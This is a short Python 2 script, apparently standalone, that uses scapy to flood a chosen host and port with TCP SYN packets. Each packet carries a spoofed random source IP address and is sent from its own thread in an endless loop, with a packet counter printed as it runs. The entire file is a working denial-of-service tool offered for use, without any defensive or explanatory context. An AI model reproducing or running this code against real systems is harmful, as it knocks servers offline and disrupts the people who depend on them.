from scapy.all import *
import sys,socket,threading,random

if len(sys.argv)!=3:
	print'Usage {} <Target> <Port>'.format(sys.argv[0])
	sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])

total = 0
class synFlood(threading.Thread):
        global target, port
        def __init__(self):
                threading.Thread.__init__(self)
	def addr_rand(self):
		addr = "{}.{}.{}.{}".format(random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
		return addr
	def run(self):
		ip = IP(src=self.addr_rand(),dst=target)
		tcp = TCP(sport=random.randint(1,65535),dport=port,flags="S")
		p = ip/tcp
		send(p,verbose=0)

print 'Flooding {}:{} with SYN packets.'.format(target,port)
try:
	while True:
		synFlood().start()
		total+=1
		sys.stdout.write('\rTotal packets sent:\t\t {}'.format(total))
		#print '\rTotal packets sent:\t\t {}'.format(total)
except KeyboardInterrupt:
	print "\nExitting Program !!!\nTCP Dos Complete!"
except socket.gaierror:
	print "\nHostname Could Not Be Resolved !!!"
	sys.exit()
except socket.error:
	print "\nServer not responding !!!"
	sys.exit()













